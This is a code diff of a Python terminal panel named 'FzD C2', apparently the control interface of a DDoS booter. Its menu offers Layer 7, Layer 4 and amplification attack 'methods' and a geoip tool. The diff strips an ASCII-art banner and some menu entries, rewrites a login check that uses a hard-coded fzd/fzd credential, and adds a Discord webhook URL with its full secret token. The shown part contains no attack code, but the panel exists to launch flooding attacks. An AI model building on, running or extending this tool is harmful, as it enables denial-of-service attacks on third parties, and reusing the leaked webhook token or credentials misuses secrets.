-                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⣿⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀  ')
-                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀  ')
-                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⠁⠀⠹⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀  ')
-                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⡇⠀⠀⠀⢿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀  ')
-                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀  ')
-                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡏⠀⠀⠀⠀⣾⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀  ')
-                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⠿⠃⠀⠀⠐⠚⠻⢷⣦⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀  ')
-                print('⠀⠀⠀⠀⠀⠀⠀⠀⣠⡾⠿⣷⣦⡀⠀⠀⠀⠀⠀⠀⠀⣰⠟⢁⣀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀  ')
-                print('⠀⠀⠀⠀⠀⠀⢠⣾⠟⠁⠀⠀⠙⢿⣦⣄⠀⠀⠀⠀⣼⠏⣼⣧⣼⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣷⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀  ')
-                print('⠀⠀⠀⠀⠀⣴⡿⠃⠀⠀⠀⠀⠀⠀⠉⠻⣷⣤⣤⡾⢿⠐⣿⡿⠃⠀⠀⠀⢀⡖⠒⣦⡀⠀⠀⠀⠀⠈⠙⠛⠷⣦⣄⡀⠀⠀⠀⠀⠀  ')
-                print('⠀⠀⠀⢠⣾⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⡿⠁⢸⠀⠀⣤⡄⠀⠀⠀⢸⣧⣤⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⣶⣄⠀⠀⠀  ')
-                print('⠀⠀⣰⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣇⡠⠃⠀⣀⡈⠀⠀⠀⠀⠘⢿⣿⣿⠟⠀⠀⠀⠀⠠⣄⠀⠀⠀⠀⠀⠈⢻⣷⣄⠀  ')
-                print('⠀⣰⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡇⠀⠀⢹⡟⠓⣶⠀⠀⠀⠀⣨⣤⣤⡀⠀⠀⠀⠀⢸⣿⣶⣦⣤⣶⣾⣿⣿⣿⣆  ')
-                print('⢠⣿⣷⣶⣶⣶⣶⣤⣤⣤⣤⣄⣀⡀⠀⠀⠀⠀⠘⣧⠀⠀⠈⣄⠀⡏⠀⠀⠀⢸⣿⣿⣿⣿⠀⠀⠀⠀⣸⡟⠀⠉⠙⠛⠛⠿⠿⠿⠛  ')
-                print('⠈⠉⠉⠉⠉⠉⠉⠉⠉⠉⣹⣿⠟⠋⠀⠀⣠⣴⡿⠿⣷⣄⠀⠈⠓⠁⠀⠀⠀⠈⠿⣿⡿⠏⠀⠀⠀⢀⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀  ')
-                print('⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⡟⠁⠀⠀⠀⢾⣿⣯⡀⠀⢸⡏⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠒⠛⠛⠿⣷⡄⠀⠀⠀⠀⠀⠀⠀⠀  ')
-                print('⠀⠀⠀⠀⠀⠀⠀⠀⠙⠛⠿⢿⣶⣦⣤⣀⠈⠙⢿⣶⣼⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⡇⠀⠀⠀⠀⠈⣿⡀⠀⠀⠀⠀⠀⠀⠀  ')
-                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⣿⡿⠃⣠⣿⢋⣽⣷⠀⠀⠀⠀⠉⠳⢦⡀⠀⠀⠀⠈⣧⠀⠀⠀⠀⠀⣿⡇⠀⠀⠀⠀⠀⠀⠀  ')
-                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⣿⣷⣶⣿⣧⣾⣿⣿⡆⠀⠀⠀⠀⠀⠀⠹⣆⠀⠀⠀⠈⠻⢦⣤⣤⣴⡟⠀⠀⠀⠀⠀⠀⠀⠀  ')
-                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⢿⣿⣿⣿⣿⣿⠋⠉⠛⠃⠀⠀⠀⠀⠀⠀⠀⠘⡆⠀⠀⠀⠀⠀⠀⠀⢹⣧⠀⠀⠀⠀⠀⠀⠀⠀  ')
-                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢈⣿⣿⣿⣧⡀⠀⠀⠀⠈⠳⣤⡀⠀⠀⠀⢀⡗⠀⠀⠀⠀⠀⠀⠀⠈⣿⡆⠀⠀⠀⠀⠀⠀⠀  ')
-                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⣿⣿⣿⣷⡄⠀⠀⠀⠀⠈⠙⠓⠶⠶⠞⠁⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⠀⠀⠀⠀⠀⠀⠀  ')
-                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡿⠛⠋⠀⠀⠀⠀⠀⠀⢰⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⣇⠀⠀⠀⠀⠀⠀  ')
-                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣷⡀⠀⠀⠀⠀⠀⠀⠀⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⠀⠀⠀⠀⠀⠀  ')
-                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣷⡀⠀⠀⠀⠀⠀⠀⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⠀⠀⠀⠀⠀⠀  ')
-                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⣤⠀⠀⠀⠀⣰⠃⠀⠀⠀⠀⠀⠀⣀⣠⣤⣾⠁⠀⠀⠀⣸⣿⡀⠀⠀⠀⠀⠀  ')
-                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⣉⣀⣀⣀⣤⣾⣿⣷⣶⣶⣶⣿⡿⠿⠿⠛⠛⠿⣷⣤⣄⡈⠀⠉⣿⡆⠀⠀⠀⠀  ')
-                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⠿⠿⠛⠛⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠙⠛⠛⠛⠛⠁⠀⠀⠀⠀  ')
-
                 
 # TOOLS
         elif "geoip" in cnc:
@@ -738,11 +645,8 @@ LAYER7  ► SHOW LAYER7 METHODS
 LAYER4  ► SHOW LAYER4 METHODS
 AMP     ► SHOW AMP METHODS
 SPECIAL ► SHOW SPECIAL METHODS
-BANNERS ► SHOW BANNERS
-RULES   ► RULES PANEL
 PORTS   ► SHOW ALL PORTS
 TOOLS   ► SHOW TOOLS
-CLEAR   ► CLEAR TERMINAL
             ''')
 
         else:
@@ -751,22 +655,21 @@ CLEAR   ► CLEAR TERMINAL
                 print("Command: [ " + cmmnd + " ] Not Found!")
             except IndexError:
                 pass
+                
+webhook_url = "https://discord.com/api/webhooks/1120049356687560726/HCEGcv4uqlTu4X5ATB7sVLihAUVXxfWdC9yYikP3MFaYJ4yfjpwhKno-F9DrT-SoPrTQ"
 
-
-def login():
-    clear()
-    user = "fzd"
-    passwd = "fzd"
-    username = input("⚡ Username: ")
-    password = getpass.getpass(prompt='⚡ Password: ')
-    if username != user or password != passwd:
-        print("")
-        print("⚡ Haizzz, Bego ini tools private")
-        sys.exit(1)
-    elif username == user and password == passwd:
-        print("⚡ Welcome Bro To FzD C2!")
-        time.sleep(0.3)
-        ascii_vro()
-        main()
-
+def login(): 
+     clear() 
+     user = "fzd" 
+     passwd = "fzd" 
+     username = input("⚡ Username: ") 
+     password = getpass.getpass(prompt='⚡ Password: ') 
+     if username != user or password != passwd: 
+         print("") 
+         print("⚡ You Poor Bitches.") 
+         sys.exit(1) 
+     elif username == user and password == passwd: 
+         print("⚡ Welcome Bro To FzD C2!") 
+         main() 
+     
 login()
